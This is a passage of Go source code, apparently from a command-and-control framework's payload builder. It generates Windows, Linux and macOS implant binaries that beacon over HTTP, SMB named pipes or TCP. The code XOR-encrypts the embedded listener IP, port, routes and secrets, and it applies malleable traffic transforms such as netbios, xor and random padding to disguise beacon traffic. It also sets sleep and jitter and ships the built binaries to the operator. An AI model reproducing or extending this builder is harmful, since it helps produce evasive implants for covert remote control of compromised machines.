	if strings.ToLower(req.Data.OS) == "windows" {
		fileExtension = ".exe"
	}
	return fmt.Sprintf("%s_%s_%s_%s_%s_payload%s",
		strings.ToLower(b.listener.Protocol),
		strings.ToLower(req.Data.Language),
		strings.ToLower(req.Data.Arch),
		b.listener.Name,
		timestamp,
		fileExtension,
	)
}

func (b *Builder) storeBuildData(ctx context.Context, data *buildData) error {
	_, err := b.db.ExecContext(ctx, `
        INSERT INTO inits (id, clientID, type, secret, os, arch, RSAkey, smb_profile, smb_xor_key, http_xor_key, tcp_profile, tcp_xor_key, protocol)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)
    `,
		data.initID,
		data.clientID,
		data.connectionType,
		data.secret,
		data.os,
		data.arch,
		data.keyPair.PrivateKeyPEM,
		data.smbProfile,
		data.smbXorKey,
		data.httpXorKey,
		data.tcpProfile,
		data.tcpXorKey,
		strings.ToUpper(data.payloadType), // Store protocol: "HTTP", "SMB", or "TCP"
	)
	return err
}

func (b *Builder) registerWithAgentService(ctx context.Context, data *buildData) error {
	initData := map[string]string{
		"id":         data.initID.String(),
		"clientID":   data.clientID.String(),
		"type":       data.connectionType,
		"secret":     data.secret,
		"os":         data.os,
		"arch":       data.arch,
		"rsaKey":     data.keyPair.PrivateKeyPEM,
		"protocol":   b.listener.Protocol,
		"smbProfile": data.smbProfile,
		"smbXorKey":  data.smbXorKey,
		"httpXorKey": data.httpXorKey,
		"tcpProfile": data.tcpProfile,
		"tcpXorKey":  data.tcpXorKey,
		"tcpPort":    data.tcpPort,
	}

	grpcCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	return b.agentClient.RegisterInit(grpcCtx, initData)
}

// Updated prepareBuildEnvironment function to support profile-based HTTP methods
func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *PayloadConfigWrapper) ([]string, error) {
	// Load malleable config for rekey command (fallback)
	malleableConfig, err := config.GetMalleableConfig()
	if err != nil {
		log.Printf("[Builder] Warning: Failed to load malleable config: %v", err)
	}
	rekeyCommand := "rekey_required" // Default
	rekeyStatusField := "status"
	rekeyDataField := "data"
	rekeyIDField := "command_db_id"

	// Check if listener has a bound server response profile
	if b.listener.ServerResponseProfile != "" && b.agentConfig != nil {
		responseProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile)
		if responseProfile != nil {
			if responseProfile.RekeyValue != "" {
				rekeyCommand = responseProfile.RekeyValue
			}
			if responseProfile.StatusField != "" {
				rekeyStatusField = responseProfile.StatusField
			}
			if responseProfile.DataField != "" {
				rekeyDataField = responseProfile.DataField
			}
			if responseProfile.CommandIDField != "" {
				rekeyIDField = responseProfile.CommandIDField
			}
			log.Printf("[Builder] Using server response profile %q - rekey: %q, fields: {%s, %s, %s}",
				b.listener.ServerResponseProfile, rekeyCommand, rekeyStatusField, rekeyDataField, rekeyIDField)
		}
	} else if malleableConfig != nil {
		rekeyCommand = malleableConfig.RekeyCommand
		rekeyStatusField = malleableConfig.RekeyStatusField
		rekeyDataField = malleableConfig.RekeyDataField
		rekeyIDField = malleableConfig.RekeyIDField
		log.Printf("[Builder] Using malleable rekey for build - command: %q, fields: {%s, %s, %s}",
			rekeyCommand, rekeyStatusField, rekeyDataField, rekeyIDField)
	}

	// First prepare custom headers
	customHeaders := make(map[string]string)
	for _, header := range payloadConfig.PayloadConfig.HTTPHeaders.CustomHeaders {
		customHeaders[header.Name] = header.Value
	}
	headersJSON, err := json.Marshal(customHeaders)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal custom headers: %v", err)
	}

	// Extract GET handler details - use bound profile if available
	getMethod := "GET" // Default
	var getClientIDParam struct {
		Name   string
		Format string
	}
	var getRoute string

	// Check if listener has a bound GET profile
	if b.listener.GetProfile != "" && b.agentConfig != nil {
		getProfile := b.agentConfig.GetGetProfile(b.listener.GetProfile)
		if getProfile != nil {
			getRoute = getProfile.Path
			if getProfile.Method != "" {
				getMethod = getProfile.Method
			}
			// Extract clientID param from profile
			for _, param := range getProfile.Params {
				if param.Type == "clientID_param" {
					getClientIDParam.Name = param.Name
					getClientIDParam.Format = param.Format
					break
				}
			}
			log.Printf("[Builder] Using GET profile %q: path=%s, method=%s",
				b.listener.GetProfile, getRoute, getMethod)
		} else {
			log.Printf("[Builder] Warning: GET profile %q not found, falling back to global routes",
				b.listener.GetProfile)
		}
	}

	// Fallback to global routes if no profile matched
	if getRoute == "" {
		for _, handler := range payloadConfig.HTTPRoutes.GetHandlers {
			if handler.Enabled {
				getRoute = handler.Path
				if handler.Method != "" {
					getMethod = handler.Method
				}
				for _, param := range handler.Params {
					if param.Type == "clientID_param" {
						getClientIDParam.Name = param.Name
						getClientIDParam.Format = param.Format
						break
					}
				}
				break
			}
		}
	}

	// Extract POST handler details - use bound profile if available
	postMethod := "POST" // Default
	var postClientIDParam struct {
		Name   string
		Format string
	}
	var secretParam struct {
		Name   string
		Format string
	}
	var postRoute string

	// Check if listener has a bound POST profile
	if b.listener.PostProfile != "" && b.agentConfig != nil {
		postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile)
		if postProfile != nil {
			postRoute = postProfile.Path
			if postProfile.Method != "" {
				postMethod = postProfile.Method
			}
			// Extract params from profile
			for _, param := range postProfile.Params {
				switch param.Type {
				case "clientID_param":
					postClientIDParam.Name = param.Name
					postClientIDParam.Format = param.Format
				case "secret_param":
					secretParam.Name = param.Name
					secretParam.Format = param.Format
				}
			}
			log.Printf("[Builder] Using POST profile %q: path=%s, method=%s",
				b.listener.PostProfile, postRoute, postMethod)
		} else {
			log.Printf("[Builder] Warning: POST profile %q not found, falling back to global routes",
				b.listener.PostProfile)
		}
	}

	// Fallback to global routes if no profile matched
	if postRoute == "" {
		for _, handler := range payloadConfig.HTTPRoutes.PostHandlers {
			if handler.Enabled {
				postRoute = handler.Path
				if handler.Method != "" {
					postMethod = handler.Method
				}
				for _, param := range handler.Params {
					switch param.Type {
					case "clientID_param":
						postClientIDParam.Name = param.Name
						postClientIDParam.Format = param.Format
					case "secret_param":
						secretParam.Name = param.Name
						secretParam.Format = param.Format
					}
				}
				break
			}
		}
	}

	log.Printf("Building payload with HTTP methods: GET=%s, POST=%s", getMethod, postMethod)
	log.Printf("Building payload with profiles: GET=%s, POST=%s, Response=%s",
		b.listener.GetProfile, b.listener.PostProfile, b.listener.ServerResponseProfile)

	// Serialize transform DataBlocks from profiles
	// NOTE: Per-build unique XOR keys are only applied to DATA transforms, not clientID transforms.
	// This is because the server needs to extract clientID first (using static profile key) to
	// identify the agent, then look up the agent's unique key for data extraction.
	var getClientIDTransforms, postClientIDTransforms, postDataTransforms, responseDataTransforms string

	if b.listener.GetProfile != "" && b.agentConfig != nil {
		if getProfile := b.agentConfig.GetGetProfile(b.listener.GetProfile); getProfile != nil {
			if getProfile.ClientID != nil {
				// ClientID uses static profile key (no per-build modification)
				getClientIDTransforms = serializeDataBlockCompact(getProfile.ClientID)
			}
		}
	}

	if b.listener.PostProfile != "" && b.agentConfig != nil {
		if postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile); postProfile != nil {
			if postProfile.ClientID != nil {
				// ClientID uses static profile key (no per-build modification)
				postClientIDTransforms = serializeDataBlockCompact(postProfile.ClientID)
			}
			if postProfile.Data != nil {
				// Data uses static profile XOR key (no per-build modification)
				// Server applies same transforms with same key from profile
				postDataTransforms = serializeDataBlockCompact(postProfile.Data)
			}
		}
	}

	if b.listener.ServerResponseProfile != "" && b.agentConfig != nil {
		if respProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile); respProfile != nil {
			if respProfile.Data != nil {
				// Response data uses static profile XOR key (no per-build modification)
				// Server applies same transforms with same key from profile
				responseDataTransforms = serializeDataBlockCompact(respProfile.Data)
			}
		}
	}

	// Values that should be encrypted
	encryptedValues := map[string]string{
		"PUBLIC_KEY":            data.keyPair.PublicKeyPEM,
		"SECRET":                data.secret,
		"PROTOCOL":              b.listener.Protocol,
		"IP":                    b.listener.IP,
		"PORT":                  fmt.Sprintf("%d", b.listener.Port),
		"GET_METHOD":            getMethod,  // Add custom GET method
		"POST_METHOD":           postMethod, // Add custom POST method
		"USER_AGENT":            payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
		"CONTENT_TYPE":          payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
		"CUSTOM_HEADERS":        string(headersJSON),
		"GET_ROUTE":             getRoute,
		"POST_ROUTE":            postRoute,
		"GET_CLIENT_ID_NAME":    getClientIDParam.Name,
		"GET_CLIENT_ID_FORMAT":  getClientIDParam.Format,
		"POST_CLIENT_ID_NAME":   postClientIDParam.Name,
		"POST_CLIENT_ID_FORMAT": postClientIDParam.Format,
		"POST_SECRET_NAME":      secretParam.Name,
		"POST_SECRET_FORMAT":    secretParam.Format,
		// Malleable transform configs (JSON-encoded DataBlocks)
		"GET_CLIENTID_TRANSFORMS":  getClientIDTransforms,
		"POST_CLIENTID_TRANSFORMS": postClientIDTransforms,
		"POST_DATA_TRANSFORMS":     postDataTransforms,
		"RESPONSE_DATA_TRANSFORMS": responseDataTransforms,
	}

	// Encrypt all values
	for k, v := range encryptedValues {
		encryptedValues[k] = xorEncrypt(v, data.xorKey)
	}

	// Create base environment variables
	envVars := []string{
		"BUILD=TRUE",
		fmt.Sprintf("XOR_KEY=%s", data.xorKey),
		fmt.Sprintf("OS=%s", strings.ToLower(data.os)),
		fmt.Sprintf("ARCH=%s", data.arch),
		fmt.Sprintf("OUTPUT_FILENAME=%s", data.binaryName),
		fmt.Sprintf("CLIENTID=%s", data.clientID),
		fmt.Sprintf("SLEEP=%d", payloadConfig.PayloadConfig.Sleep),
		fmt.Sprintf("JITTER=%d", payloadConfig.PayloadConfig.Jitter),
		fmt.Sprintf("MALLEABLE_REKEY_COMMAND=%s", rekeyCommand),
		fmt.Sprintf("MALLEABLE_REKEY_STATUS_FIELD=%s", rekeyStatusField),
		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
		fmt.Sprintf("PAYLOAD_TYPE=%s", data.payloadType),
	}

	// Add SMB-specific environment variables
	if data.payloadType == "smb" {
		envVars = append(envVars, fmt.Sprintf("PIPE_NAME=%s", data.pipeName))
		// Note: SECRET is passed via encryptedValues loop below (XOR encrypted with xorKey)
		// This provides the same security level as HTTPS agents - secrets are never stored in plain text

		// Create encrypted config for SMB agent
		// The config is XOR encrypted with the PLAIN secret
		// At runtime, the agent will:
		// 1. Decrypt the secret using xorKey (from encryptedValues)
		// 2. Use the decrypted secret to decrypt this config
		smbConfig := map[string]string{
			"Pipe Name":  data.pipeName,
			"Secret":     data.secret,
			"Public Key": data.keyPair.PublicKeyPEM,
		}
		configJSON, err := json.Marshal(smbConfig)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal SMB config: %v", err)
		}

		// XOR encrypt config with the plain secret
		secretBytes := []byte(data.secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[Builder] Created encrypted SMB config for pipe: %s", data.pipeName)

		// Serialize SMB profile transforms if configured
		if data.smbProfile != "" {
			smbLinkConfig, err := config.GetSMBLinkConfig()
			if err == nil && smbLinkConfig != nil {
				if smbProfile := smbLinkConfig.GetSMBProfile(data.smbProfile); smbProfile != nil && smbProfile.Data != nil {
					// Modify XOR transform values to use per-build unique key
					modifiedData := modifyXorTransformValue(smbProfile.Data, data.smbXorKey)
					smbDataTransforms := serializeDataBlockCompact(modifiedData)
					if smbDataTransforms != "" {
						// XOR encrypt with xorKey (same as other encrypted values)
						xorKeyBytes := []byte(data.xorKey)
						transformBytes := []byte(smbDataTransforms)
						encryptedTransforms := make([]byte, len(transformBytes))
						for i, b := range transformBytes {
							encryptedTransforms[i] = b ^ xorKeyBytes[i%len(xorKeyBytes)]
						}
						encryptedValues["SMB_DATA_TRANSFORMS"] = base64.StdEncoding.EncodeToString(encryptedTransforms)
						log.Printf("[Builder] Added SMB data transforms with unique XOR key from profile: %s", data.smbProfile)
					}
				} else {
					log.Printf("[Builder] SMB profile '%s' not found or has no transforms", data.smbProfile)
				}
			}
		}
	}

	// Add TCP-specific environment variables
	if data.payloadType == "tcp" {
		envVars = append(envVars, fmt.Sprintf("TCP_PORT=%s", data.tcpPort))

		// Create encrypted config for TCP agent
		// The config is XOR encrypted with the PLAIN secret
		// Key names must match what the TCP agent expects in main.go
		tcpConfig := map[string]string{
			"TCP Port":   data.tcpPort,
			"Secret":     data.secret,
			"Public Key": data.keyPair.PublicKeyPEM,
		}
		configJSON, err := json.Marshal(tcpConfig)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal TCP config: %v", err)
		}

		// XOR encrypt config with the plain secret
		secretBytes := []byte(data.secret)
		encrypted := make([]byte, len(configJSON))
		for i, b := range configJSON {
			encrypted[i] = b ^ secretBytes[i%len(secretBytes)]
		}
		encryptedConfig := base64.StdEncoding.EncodeToString(encrypted)

		envVars = append(envVars, fmt.Sprintf("ENCRYPTED_CONFIG=%s", encryptedConfig))
		log.Printf("[Builder] Created encrypted TCP config for port: %s", data.tcpPort)

		// Serialize TCP profile transforms if configured
		if data.tcpProfile != "" {
			tcpLinkConfig, err := config.GetTCPLinkConfig()
			if err == nil && tcpLinkConfig != nil {
				if tcpProfile := tcpLinkConfig.GetTCPProfile(data.tcpProfile); tcpProfile != nil && tcpProfile.Data != nil {
					// Modify XOR transform values to use per-build unique key
					modifiedData := modifyXorTransformValue(tcpProfile.Data, data.tcpXorKey)
					tcpDataTransforms := serializeDataBlockCompact(modifiedData)
					if tcpDataTransforms != "" {
						// XOR encrypt with xorKey (same as other encrypted values)
						xorKeyBytes := []byte(data.xorKey)
						transformBytes := []byte(tcpDataTransforms)
						encryptedTransforms := make([]byte, len(transformBytes))
						for i, b := range transformBytes {
							encryptedTransforms[i] = b ^ xorKeyBytes[i%len(xorKeyBytes)]
						}
						encryptedValues["TCP_DATA_TRANSFORMS"] = base64.StdEncoding.EncodeToString(encryptedTransforms)
						log.Printf("[Builder] Added TCP data transforms with unique XOR key from profile: %s", data.tcpProfile)
					}
				} else {
					log.Printf("[Builder] TCP profile '%s' not found or has no transforms", data.tcpProfile)
				}
			}
		}
	}

	// Add encrypted values to environment variables
	for k, v := range encryptedValues {
		envVars = append(envVars, fmt.Sprintf("%s=%s", k, v))
	}

	return envVars, nil
}

func (b *Builder) buildPayloadBinary(ctx context.Context, binaryName string, envVars []string) (string, error) {
	config := &container.Config{
		Image: "docker_builder:latest",
		Env:   envVars,
		Tty:   true,
	}

	// Get the host payloads path from environment variable
	// This is set by docker-compose using ${PWD}/payloads
	hostPayloadsPath := os.Getenv("HOST_PAYLOADS_PATH")
	if hostPayloadsPath == "" {
		return "", fmt.Errorf("HOST_PAYLOADS_PATH environment variable not set - check docker-compose.yml")
	}

	log.Printf("[Builder] Using host payloads path: %s", hostPayloadsPath)

	hostConfig := &container.HostConfig{
		NetworkMode: "host",
		Binds: []string{
			"/shared:/shared",
			fmt.Sprintf("%s/Darwin:/build/Darwin:ro", hostPayloadsPath),
			fmt.Sprintf("%s/Linux:/build/Linux:ro", hostPayloadsPath),
			fmt.Sprintf("%s/Windows:/build/Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/SMB_Windows:/build/SMB_Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Linux:/build/TCP_Linux:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Darwin:/build/TCP_Darwin:ro", hostPayloadsPath),
			fmt.Sprintf("%s/TCP_Windows:/build/TCP_Windows:ro", hostPayloadsPath),
			fmt.Sprintf("%s/shared:/build/shared:ro", hostPayloadsPath),
		},
	}

	if err := b.ensureBuilderImage(ctx); err != nil {
		return "", err
	}

	filePath := fmt.Sprintf("/shared/%s", binaryName)
	if err := b.runBuilderContainer(ctx, config, hostConfig); err != nil {
		return "", err
	}

	return filePath, nil
}

func (b *Builder) ensureBuilderImage(ctx context.Context) error {
	_, _, err := b.dockerClient.ImageInspectWithRaw(ctx, "docker_builder:latest")
	if err != nil {
		if client.IsErrNotFound(err) {
			log.Printf("Builder image not found. Building image...")
			buildCmd := exec.Command("docker", "compose", "build", "builder")
			buildCmd.Stdout = log.Writer()
			buildCmd.Stderr = log.Writer()
			if err := buildCmd.Run(); err != nil {
				return fmt.Errorf("failed to build builder image: %v", err)
			}
			log.Printf("Builder image built successfully")
			return nil
		}
		return fmt.Errorf("error checking builder image: %v", err)
	}
	return nil
}

func (b *Builder) runBuilderContainer(ctx context.Context, config *container.Config, hostConfig *container.HostConfig) error {
	resp, err := b.dockerClient.ContainerCreate(ctx, config, hostConfig, nil, nil, "")
	if err != nil {
		return fmt.Errorf("container creation failed: %v", err)
	}

	waiter, err := b.dockerClient.ContainerAttach(ctx, resp.ID, container.AttachOptions{
		Stream: true,
		Stdout: true,
		Stderr: true,
		Logs:   true,
	})
	if err != nil {
		return fmt.Errorf("failed to attach to container: %v", err)
	}
	defer waiter.Close()

	go func() {
		io.Copy(log.Writer(), waiter.Reader)
	}()

	if err := b.dockerClient.ContainerStart(ctx, resp.ID, container.StartOptions{}); err != nil {
		return fmt.Errorf("container start failed: %v", err)
	}

	statusCh, errCh := b.dockerClient.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
	select {
	case err := <-errCh:
		return fmt.Errorf("container wait failed: %v", err)
	case status := <-statusCh:
		if status.StatusCode != 0 {
			return fmt.Errorf("build failed with status: %d", status.StatusCode)
		}
	}

	return nil
}

func (b *Builder) sendAndCleanup(ctx context.Context, binaryPath string) error {
	if err := b.sendBinaryFile(ctx, binaryPath, b.clientUsername); err != nil {
		return fmt.Errorf("failed to send binary: %v", err)
	}

	if err := os.Remove(binaryPath); err != nil {
		log.Printf("Failed to delete binary file: %v", err)
	}

	return nil
}

func (b *Builder) validateRequest(req PayloadRequest) error {
	validOS := map[string]string{
		"darwin":  "darwin",
		"linux":   "linux",
		"windows": "windows",
		"Darwin":  "darwin",
		"Linux":   "linux",
		"Windows": "windows",
	}
	validArch := map[string]string{
		"amd64": "amd64",
		"arm64": "arm64",
	}
	validLanguage := map[string]bool{
		"go":        true,
		"goproject": true,
	}

	if _, exists := validOS[req.Data.OS]; !exists {
		return fmt.Errorf("invalid OS: %s", req.Data.OS)
	}
	if _, exists := validArch[req.Data.Arch]; !exists {
		return fmt.Errorf("invalid architecture: %s", req.Data.Arch)
	}
	if !validLanguage[strings.ToLower(req.Data.Language)] {
		return fmt.Errorf("invalid language: %s", req.Data.Language)
	}
	return nil
}

func xorEncrypt(input, key string) string {
	var result []byte
	for i := 0; i < len(input); i++ {
		result = append(result, input[i]^key[i%len(key)])
	}
	return base64.StdEncoding.EncodeToString(result)
}

// Transform type codes (maps readable names to single char codes)
var transformTypeMap = map[string]string{
	"base64":         "a",
	"base64url":      "b",
	"hex":            "c",
	"gzip":           "d",
	"netbios":        "e",
	"xor":            "f",
	"prepend":        "g",
	"append":         "h",
	"random_prepend": "i",
	"random_append":  "j",
}

// Charset codes
var charsetMap = map[string]string{
	"numeric":      "1",
	"alpha":        "2",
	"alphanumeric": "3",
	"hex":          "4",
}

// profileUsesXorTransform checks if any HTTP profile DataBlock contains XOR transforms
func (b *Builder) profileUsesXorTransform() bool {
	if b.agentConfig == nil || b.listener == nil {
		return false
	}

	checkDataBlock := func(db *config.DataBlock) bool {
		if db == nil {
			return false
		}
		for _, t := range db.Transforms {
			if t.Type == "xor" {
				return true
			}
		}
		return false
	}

	// Only check Data blocks (not ClientID) - unique keys are only applied to Data transforms
	// This is because clientID must use static profile key for server to identify the agent

	// Check POST profile Data
	if postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile); postProfile != nil {
		if checkDataBlock(postProfile.Data) {
			return true
		}
	}

	// Check Server Response profile Data
	if respProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile); respProfile != nil {
		if checkDataBlock(respProfile.Data) {
			return true
		}
	}

	return false
}

// modifyXorTransformValue creates a copy of DataBlock with XOR transform values replaced
// This is used to embed per-build unique XOR keys instead of the static key from config.toml
func modifyXorTransformValue(db *config.DataBlock, newXorKey string) *config.DataBlock {
	if db == nil || newXorKey == "" {
		return db
	}

	// Deep copy the DataBlock
	modifiedDB := &config.DataBlock{
		Output:     db.Output,
		Transforms: make([]config.Transform, len(db.Transforms)),
	}

	for i, t := range db.Transforms {
		modifiedDB.Transforms[i] = t
		// Replace XOR transform value with unique key
		if t.Type == "xor" {
			modifiedDB.Transforms[i].Value = newXorKey
		}
	}

	return modifiedDB
}

// serializeDataBlockCompact serializes a DataBlock to compact JSON format
// Uses short keys to minimize binary size: "o" for output, "t" for transforms,
// "T" for type, "V" for value, "L" for length, "C" for charset
// Transform types and charsets are converted to single-char codes
func serializeDataBlockCompact(db *config.DataBlock) string {
	if db == nil {
		return ""
	}

	// Create compact structure with short keys
	type compactTransform struct {
		Type    string `json:"T"`
		Value   string `json:"V,omitempty"`
		Length  int    `json:"L,omitempty"`
		Charset string `json:"C,omitempty"`
	}

	type compactDataBlock struct {
		Output     string             `json:"o"`
		Transforms []compactTransform `json:"t,omitempty"`
	}

	compact := compactDataBlock{
		Output: db.Output,
	}

	for _, t := range db.Transforms {
		// Convert type to short code
		typeCode := transformTypeMap[t.Type]
		if typeCode == "" {
			typeCode = t.Type // fallback to original
		}

		// Convert charset to short code
		charsetCode := charsetMap[t.Charset]
		if charsetCode == "" && t.Charset != "" {
			charsetCode = t.Charset // fallback to original
		}

		compact.Transforms = append(compact.Transforms, compactTransform{
			Type:    typeCode,
			Value:   t.Value,
			Length:  t.Length,
			Charset: charsetCode,
		})
	}

	data, err := json.Marshal(compact)
	if err != nil {
		log.Printf("[Builder] Warning: Failed to serialize DataBlock: %v", err)
		return ""
	}
	return string(data)
}

func GenerateRSAKeyPair() (*KeyPair, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate RSA key pair: %w", err)
	}

	privateKeyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	})

	publicKeyBytes := x509.MarshalPKCS1PublicKey(&privateKey.PublicKey)
	publicKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: publicKeyBytes,
	})

	return &KeyPair{
		PrivateKeyPEM: base64.StdEncoding.EncodeToString(privateKeyPEM),
		PublicKeyPEM:  string(publicKeyPEM),
	}, nil
}

func GenerateRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		randomInt, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result[i] = charset[randomInt.Int64()]
	}
	return string(result), nil
}

// Improved sendBinaryFile
func (b *Builder) sendBinaryFile(ctx context.Context, filePath string, clientUsername string) error {
	file, err := os.Open(filePath)
	if err != nil {
		log.Printf("Failed to open file: %v", err)
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		log.Printf("Failed to get file info: %v", err)
		return fmt.Errorf("failed to get file info: %v", err)
	}

	totalChunks := (fileInfo.Size() + ChunkSize - 1) / ChunkSize
	buffer := make([]byte, ChunkSize)

	// Send initial notification about binary transfer starting
	startMsg := struct {
		Type string `json:"type"`
		Data struct {
			FileName    string `json:"file_name"`
			TotalChunks int64  `json:"total_chunks"`
			FileSize    int64  `json:"file_size"`
			Status      string `json:"status"`
		} `json:"data"`
	}{
		Type: "binary_transfer_start",
		Data: struct {
			FileName    string `json:"file_name"`
			TotalChunks int64  `json:"total_chunks"`
			FileSize    int64  `json:"file_size"`
			Status      string `json:"status"`
		}{
			FileName:    fileInfo.Name(),
			TotalChunks: totalChunks,
			FileSize:    fileInfo.Size(),
			Status:      "starting",
		},
	}

	startJSON, _ := json.Marshal(startMsg)
	b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, startJSON)

	// Track failed chunks for potential retry
	failedChunks := make([]int64, 0)

	// Send chunks with better error handling
	for chunkNum := int64(0); chunkNum < totalChunks; chunkNum++ {
		// Check context cancellation
		select {
		case <-ctx.Done():
			return fmt.Errorf("context cancelled during chunk transfer")
		default:
		}

		bytesRead, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			log.Printf("Failed to read chunk %d: %v", chunkNum, err)
			failedChunks = append(failedChunks, chunkNum)
			continue // Try next chunk instead of failing entirely
		}

		if bytesRead == 0 {
			break
		}

		chunkData := base64.StdEncoding.EncodeToString(buffer[:bytesRead])

		message := struct {
			Type        string `json:"type"`
			ChunkNum    int64  `json:"chunk_num"`
			TotalChunks int64  `json:"total_chunks"`
			FileSize    int64  `json:"file_size"`
			FileName    string `json:"file_name"`
			Data        string `json:"data"`
			Priority    bool   `json:"priority"` // Add priority flag
		}{
			Type:        "binary_chunk",
			ChunkNum:    chunkNum,
			TotalChunks: totalChunks,
			FileSize:    fileInfo.Size(),
			FileName:    fileInfo.Name(),
			Data:        chunkData,
			Priority:    true, // Mark as high priority
		}

		messageJSON, err := json.Marshal(message)
		if err != nil {
			log.Printf("Failed to marshal chunk message: %v", err)
			failedChunks = append(failedChunks, chunkNum)
			continue
		}

		// Enhanced retry logic with exponential backoff
		maxRetries := 5
		sent := false
		attemptCount := 0

		for attempt := 0; attempt < maxRetries && !sent; attempt++ {
			attemptCount = attempt
			// Create a timeout context for each send attempt
			sendCtx, cancel := context.WithTimeout(ctx, 2*time.Second)

			err = b.hubClient.BroadcastToUserHighPriority(sendCtx, clientUsername, messageJSON)
			cancel()

			if err == nil {
				sent = true
				log.Printf("Sent chunk %d/%d to client %s", chunkNum+1, totalChunks, clientUsername)
			} else {
				backoff := time.Duration(math.Pow(2, float64(attempt))) * 100 * time.Millisecond
				if backoff > 2*time.Second {
					backoff = 2 * time.Second
				}

				log.Printf("Failed to send chunk %d (attempt %d/%d): %v, retrying in %v",
					chunkNum, attempt+1, maxRetries, err, backoff)
				time.Sleep(backoff)
			}
		}

		if !sent {
			failedChunks = append(failedChunks, chunkNum)
			log.Printf("Failed to send chunk %d after %d retries", chunkNum, maxRetries)
		}

		// Adaptive delay between chunks
		if sent {
			// Reduce delay if no errors, increase if we had retries
			if attemptCount == 0 {
				time.Sleep(25 * time.Millisecond) // Fast path
			} else {
				time.Sleep(100 * time.Millisecond) // Slow down if network is congested
			}
		}
	}

	// Report any failed chunks
	if len(failedChunks) > 0 {
		log.Printf("Warning: %d chunks failed to send for file %s", len(failedChunks), fileInfo.Name())

		// Send partial completion with error
		errorMsg := struct {
			Type string `json:"type"`
			Data struct {
				FileName     string  `json:"file_name"`
				Status       string  `json:"status"`
				FailedChunks []int64 `json:"failed_chunks"`
				Message      string  `json:"message"`
			} `json:"data"`
		}{
			Type: "binary_transfer_complete",
			Data: struct {
				FileName     string  `json:"file_name"`
				Status       string  `json:"status"`
				FailedChunks []int64 `json:"failed_chunks"`
				Message      string  `json:"message"`
			}{
				FileName:     fileInfo.Name(),
				Status:       "partial",
				FailedChunks: failedChunks,
				Message:      fmt.Sprintf("%d chunks failed to transfer", len(failedChunks)),
			},
		}

		errorJSON, _ := json.Marshal(errorMsg)
		b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, errorJSON)

		return fmt.Errorf("partial transfer: %d chunks failed", len(failedChunks))
	}

	// Send success completion message
	completionMsg := struct {
		Type string `json:"type"`
		Data struct {
			FileName string `json:"file_name"`
			Status   string `json:"status"`
		} `json:"data"`
	}{
		Type: "binary_transfer_complete",
		Data: struct {
			FileName string `json:"file_name"`
			Status   string `json:"status"`
		}{
			FileName: fileInfo.Name(),
			Status:   "success",
		},
	}

	completionJSON, _ := json.Marshal(completionMsg)
	err = b.hubClient.BroadcastToUserHighPriority(ctx, clientUsername, completionJSON)
	if err != nil {
		log.Printf("Warning: Failed to send completion message: %v", err)
	}

	log.Printf("File %s successfully sent with completion notification.", filePath)
	return nil
}
